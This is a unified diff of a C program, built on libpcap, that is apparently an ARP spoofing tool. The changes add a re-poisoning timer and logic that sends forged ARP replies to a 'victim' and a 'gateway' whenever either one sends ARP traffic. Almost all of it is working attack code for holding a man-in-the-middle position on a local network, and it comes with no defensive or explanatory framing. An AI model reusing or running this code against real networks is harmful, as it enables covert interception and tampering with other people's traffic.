@@ -2,15 +2,24 @@
 #include <netinet/ether.h>
 #include <string.h>
 #include <stdlib.h>
+#include <sys/time.h>
 
-char* mac_ntoa(char* mac) {
-    sprintf(mac_addr, MAC_FORMAT, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]); return mac_addr;
+// set the timer to its (current value + TIME_INTERVAL) when the program starts
+int Start_Timer(struct timeval *tv, time_t sec) {
+    gettimeofday(tv, NULL);
+    tv->tv_sec += sec;
+    return 1;
 }
-//mac_ston(source string str, dest array mac)
-char* mac_aton(const char* str)
-{
-    sscanf(str, MAC_FORMAT, &mac_net[0], &mac_net[1], &mac_net[2], &mac_net[3], &mac_net[4], &mac_net[5]); //copies the value in str in MAC_FORMAT to mac[]
-    return mac_net;
+
+//Checks the current time to see whether it > TIME_INTERVAL seconds than the previously noted time.
+int Check_Timer(time_t sec) {    
+    gettimeofday(&checktv, NULL);
+    if (checktv.tv_sec-tv.tv_sec > sec) {     //current time has elapsed the 30 second interval
+        gettimeofday(&tv, NULL);
+        return 1;    
+    }
+    else
+        return 0;    
 }
 
 void get_dev_list(pcap_if_t **pdev_list) {
@@ -123,15 +132,16 @@ void send_arp_packet(pcap_t *handle, struct ether_addr *src_mac, struct in_addr 
     arp_hdr->protocol_len = sizeof(in_addr_t);   //actually don't need
     arp_hdr->opcode = htons(packet_type);
     memcpy(arp_hdr->src_mac, src_mac, ETH_ALEN);
-    memcpy(&(arp_hdr->src_ip),(char *) &(src_ip->s_addr), sizeof(arp_hdr->src_ip));
+    memcpy(&(arp_hdr->src_ip),(char *) &(src_ip->s_addr), sizeof(struct in_addr));
     memcpy(arp_hdr->dst_mac, (packet_type == ARP_QUERY?query_dst_mac:&tmp_dst_mac), ETH_ALEN);
-    memcpy(&(arp_hdr->dst_ip), (char *) &(dst_ip->s_addr), sizeof(arp_hdr->dst_ip));
+    memcpy(&(arp_hdr->dst_ip), (char *) &(dst_ip->s_addr), sizeof(struct in_addr));
 
     /* concatenate into frame */
     memcpy(frame, eth_hdr, sizeof(Ethh));
     memcpy(frame + sizeof(Ethh), arp_hdr, sizeof(Arph));
 
     /* show message in console for debug */ 
+    BLUE();
     printf("frame is ready to be transfered...\n");
     printf("[src ip]\t\t[dst ip]\n");
     printf("%s\t\t", inet_ntoa(*src_ip));
@@ -139,6 +149,7 @@ void send_arp_packet(pcap_t *handle, struct ether_addr *src_mac, struct in_addr 
     printf("[src mac]\t\t[dst mac]\n");
     printf("%s\t\t", ether_ntoa(src_mac));
     printf("%s\n", ether_ntoa(&tmp_dst_mac));
+    CLOSE();
 
     /* send packet to internet */
     if(pcap_inject(handle, frame, sizeof(frame)) == -1) {
@@ -156,32 +167,39 @@ void handle_packet(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* 
         fprintf(stdout,"Packet length less than ethernet header length\n");
         return ;
     } else {
-        printf("find packet's len is %d\n", caplen);
+        //printf("find packet's len is %d\n", caplen);
     }
     Ethh *ether_hdr = (Ethh *) packet;  
+
+    if (Check_Timer(TIME_INTERVAL)) {        
+        RED();
+        printf("Timer timeout!!\n");
+        send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
+        send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
+        CLOSE();
+    }
     /* get type of ethernet fram */
     /* Ethernet protocol ID's 
         #define	ETHERTYPE_IP		0x0800		
         #define	ETHERTYPE_ARP		0x0806	
                                     */
-    RED();
     switch(ntohs(ether_hdr->ether_type)) {
         case ETHERTYPE_IP:
-            printf("[ IP  ] packet\n");
             handle_ip(arg, pkthdr, packet);
             break;
         case ETHERTYPE_ARP:
-            printf("[ ARP ] packet\n");
             handle_arp(arg, pkthdr, packet);
             break;
         default:
             printf("[other] packet\n");
             break;
     }
-    CLOSE();
 }
 
 void handle_ip(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet) {  
+    YELLOW();
+    printf("[ IP  ] packet\n");
+    CLOSE();
     return ;
 }
 
@@ -196,19 +214,37 @@ void handle_arp(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* pac
 
     if(ntohs(arp_hdr->opcode) == ARP_QUERY) {
         YELLOW();
-        printf("[Query ] ");
+        printf("[ARP Query ] : ");
+        printf("my ip is %s\n", inet_ntoa(*(struct in_addr *)&arp_hdr->src_ip));
         printf("who's ip is %s, please tell me your mac\n", inet_ntoa(temp_addr));
-    //send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
         CLOSE();
-        send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
+        if(memcmp(eth_hdr->ether_shost, &my_arp.gateway_mac, ETH_ALEN) == 0) {
+            //it's a packet from gateway
+            printf("From Gateway...\n");
+            send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
+        } else if(memcmp(eth_hdr->ether_shost, &my_arp.victim_mac, ETH_ALEN) == 0) {
+            //it's a packet from victim
+            printf("From Victim...\n");
+            send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
+       } else if(memcmp(eth_hdr->ether_shost, &my_arp.interface_mac, ETH_ALEN) == 0) {
+            printf("From Me!!!\n");
+       }
+
     } else if(ntohs(arp_hdr->opcode) == ARP_ANS) {
         GREEN();
-        printf("[Answer] ");
+        printf("[ARP Answer] ");
         printf("my ip is %s\n", inet_ntoa(*(struct in_addr *)&arp_hdr->src_ip));
         printf("And my mac is %s\n", ether_ntoa((const struct ether_addr *)&arp_hdr->src_mac));
-    //send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
         CLOSE();
-        send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
+        if(memcmp(arp_hdr->src_ip, &my_arp.gateway_ip, sizeof(struct in_addr)) == 0) {
+            //it's a packet from gateway
+            printf("From Gateway...\n");
+            send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
+        } else if(memcmp(arp_hdr->src_ip, &my_arp.victim_ip, sizeof(struct in_addr)) == 0) {
+            //it's a packet from victim
+            printf("From Victim...\n");
+            send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
+       }
     }
 
     return ;
@@ -227,3 +263,4 @@ void get_mac_from_arp(u_char *packet, struct ether_addr *mac) {
     }
      
 }
+
